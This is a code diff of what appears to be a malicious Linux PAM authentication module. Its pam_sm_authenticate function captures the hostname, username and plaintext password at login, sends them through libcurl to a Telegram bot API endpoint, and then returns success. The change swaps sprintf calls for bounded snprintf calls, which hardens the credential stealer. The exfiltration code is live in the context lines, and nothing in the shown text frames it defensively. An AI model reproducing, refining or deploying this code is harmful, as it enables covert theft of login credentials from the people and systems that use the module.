@@ -21,8 +21,8 @@ void sendMessage(char (*message)[]) {
   //INSERT HERE YOUR USER ID
   int user_id = 1111111;
 
-  sprintf(url,"https://api.telegram.org/bot%s/sendMessage",token);
-  sprintf(data,"chat_id=%d&text=%s",user_id,*message);
+  snprintf(url,600,"https://api.telegram.org/bot%s/sendMessage",token);
+  snprintf(data,300,"chat_id=%d&text=%s",user_id,*message);
   CURL *curl;
   curl_global_init(CURL_GLOBAL_ALL);
   curl = curl_easy_init();
@@ -55,7 +55,7 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, cons
     return retval;
   }
   gethostname(hostname, sizeof hostname);
-  sprintf(message,"Hostname: %s\nUsername %s\nPassword: %s\n",hostname,username,password);
+  snprintf(message,2048,"Hostname: %s\nUsername %s\nPassword: %s\n",hostname,username,password);
   sendMessage(&message);
   return PAM_SUCCESS;
 }
